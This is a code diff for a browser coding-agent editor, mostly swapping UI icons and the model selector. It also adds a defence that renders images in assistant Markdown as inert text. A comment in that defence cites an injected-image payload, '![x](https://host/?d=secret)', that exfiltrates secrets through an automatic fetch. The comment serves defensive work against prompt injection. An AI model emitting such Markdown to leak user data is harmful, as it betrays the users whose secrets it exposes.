@@ -5,7 +5,7 @@ import React, {
 	useState,
 	useSyncExternalStore,
 } from "react";
-import Markdown from "react-markdown";
+import Markdown, { type Components } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import type {
 	Workspace,
@@ -19,6 +19,15 @@ import type {
 	FlowUI,
 } from "@bal-bot/workspace";
 import type { AgentScope } from "@bal-bot/browser-workspace";
+import { HugeiconsIcon } from "@hugeicons/react";
+import {
+	ArrowLeft01Icon,
+	ArrowUp02Icon,
+	Cancel01Icon,
+	Menu01Icon,
+	PlusSignIcon,
+	StopIcon,
+} from "@hugeicons/core-free-icons";
 import { Accounts } from "./accounts";
 import { AnchorButton } from "./anchor-button";
 import { getAccounts, type ProviderAccount } from "./providers";
@@ -36,6 +45,13 @@ import type { ExpansionPath } from "./hir-diagram";
 import { conversationItems } from "./tool-summaries";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
+import {
+	Select,
+	SelectContent,
+	SelectItem,
+	SelectTrigger,
+	SelectValue,
+} from "@/components/ui/select";
 import { Textarea } from "@/components/ui/textarea";
 
 function messageText(message: AgentMessage): string {
@@ -95,7 +111,21 @@ const emptyView: AnchorView = {
 	expanded: new Set(),
 };
 const DISCLAIMER =
-	"ballerina-agent (beta) runs entirely in your browser. Your conversation and API keys are ephemeral and never stored.";
+	"Agent view (beta) sends your code and messages to the selected provider. Your conversation and API keys are ephemeral and never stored.";
+
+// Model output is untrusted: an image would be fetched as soon as it renders,
+// letting injected Markdown such as `![x](https://host/?d=secret)` exfiltrate
+// data without any user action. Show images as inert text naming the source
+// instead (plain text, not a link, so an image nested in a link stays valid).
+const assistantMarkdownComponents: Components = {
+	img: ({ src, alt }) => (
+		<span className="break-all text-muted-foreground">
+			[image: {alt || "untitled"}
+			{typeof src === "string" && src ? ` (${src})` : ""}]
+		</span>
+	),
+};
+
 export function Editor({
 	workspace,
 }: {
@@ -456,11 +486,14 @@ export function Editor({
 							className={`message ${item.message.role} mb-5 text-sm leading-relaxed ${item.message.role === "user" ? "border bg-muted px-4 py-3" : ""}`}
 						>
 							<div className="message-label mb-1 text-[10px] font-bold text-muted-foreground">
-								{item.message.role === "user" ? "You" : "bal-bot"}
+								{item.message.role === "user" ? "You" : "Agent"}
 							</div>
 							<div className="message-body">
 								{item.message.role === "assistant" ? (
-									<Markdown remarkPlugins={[remarkGfm]}>
+									<Markdown
+										remarkPlugins={[remarkGfm]}
+										components={assistantMarkdownComponents}
+									>
 										{messageText(item.message)}
 									</Markdown>
 								) : (
@@ -527,25 +560,37 @@ export function Editor({
 						}}
 					/>
 					<div className="composer-bottom mt-2 flex items-center justify-between gap-2">
-						<label className="composer-model min-w-0">
-							<span className="sr-only">Model</span>
-							<select
-								className="h-7 min-w-0 max-w-64 truncate border bg-background px-1.5 text-[11px] text-muted-foreground disabled:opacity-50"
-								aria-label="Model"
-								value={activeModel?.id ?? ""}
+						<div className="composer-model min-w-0">
+							<Select
+								items={providerModels.map((m) => ({
+									value: m.id,
+									label: m.name,
+								}))}
+								value={activeModel?.id ?? null}
 								disabled={busy || !providerModels.length}
-								onChange={(e) => setModel(e.target.value)}
+								onValueChange={(id) => {
+									if (id) setModel(id);
+								}}
 							>
-								{!providerModels.length && (
-									<option value="">Loading models…</option>
-								)}
-								{providerModels.map((m) => (
-									<option key={m.id} value={m.id}>
-										{m.name}
-									</option>
-								))}
-							</select>
-						</label>
+								<SelectTrigger
+									size="sm"
+									aria-label="Model"
+									className="min-w-0 max-w-64 bg-background text-[11px] text-muted-foreground"
+								>
+									<SelectValue placeholder="Loading models…" />
+								</SelectTrigger>
+								<SelectContent
+									align="start"
+									className="w-auto min-w-(--anchor-width) max-w-(--available-width)"
+								>
+									{providerModels.map((m) => (
+										<SelectItem key={m.id} value={m.id}>
+											{m.name}
+										</SelectItem>
+									))}
+								</SelectContent>
+							</Select>
+						</div>
 						{busy ? (
 							<Button
 								type="button"
@@ -553,7 +598,12 @@ export function Editor({
 								size="sm"
 								onClick={() => agent.current?.abort()}
 							>
-								Stop ■
+								<HugeiconsIcon
+									icon={StopIcon}
+									strokeWidth={1.5}
+									aria-hidden="true"
+								/>
+								Stop
 							</Button>
 						) : (
 							<Button
@@ -567,7 +617,11 @@ export function Editor({
 									draft.references.some((r) => r.stale)
 								}
 							>
-								↑
+								<HugeiconsIcon
+									icon={ArrowUp02Icon}
+									strokeWidth={1.5}
+									aria-hidden="true"
+								/>
 							</Button>
 						)}
 					</div>
@@ -618,7 +672,11 @@ export function Editor({
 							}
 							onClick={() => setSidebarCollapsed(!sidebarCollapsed)}
 						>
-							☰
+							<HugeiconsIcon
+								icon={Menu01Icon}
+								strokeWidth={1.5}
+								aria-hidden="true"
+							/>
 						</Button>
 					</div>
 					<div
@@ -666,7 +724,11 @@ export function Editor({
 								aria-label="New file"
 								onClick={() => setCreating(!creating)}
 							>
-								+
+								<HugeiconsIcon
+									icon={PlusSignIcon}
+									strokeWidth={1.5}
+									aria-hidden="true"
+								/>
 							</Button>
 						</div>
 						{creating && (
@@ -765,7 +827,12 @@ export function Editor({
 									setEditing(false);
 								}}
 							>
-								← Back to chat
+								<HugeiconsIcon
+									icon={ArrowLeft01Icon}
+									strokeWidth={1.5}
+									aria-hidden="true"
+								/>
+								Back to chat
 							</Button>
 						)}
 					</div>
@@ -782,7 +849,11 @@ export function Editor({
 								aria-label="Dismiss error"
 								onClick={() => setError("")}
 							>
-								×
+								<HugeiconsIcon
+									icon={Cancel01Icon}
+									strokeWidth={1.5}
+									aria-hidden="true"
+								/>
 							</Button>
 						</div>
 					)}
@@ -924,12 +995,18 @@ export function Editor({
 					{view.inspectedFunction && (
 						<button
 							type="button"
-							className="back-definitions"
+							className="back-definitions inline-flex items-center gap-1"
 							onClick={() =>
 								updateView((v) => ({ ...v, inspectedFunction: undefined }))
 							}
 						>
-							← Definitions
+							<HugeiconsIcon
+								icon={ArrowLeft01Icon}
+								strokeWidth={1.5}
+								className="size-3.5"
+								aria-hidden="true"
+							/>
+							Definitions
 						</button>
 					)}
 					{visibleFlow ? (
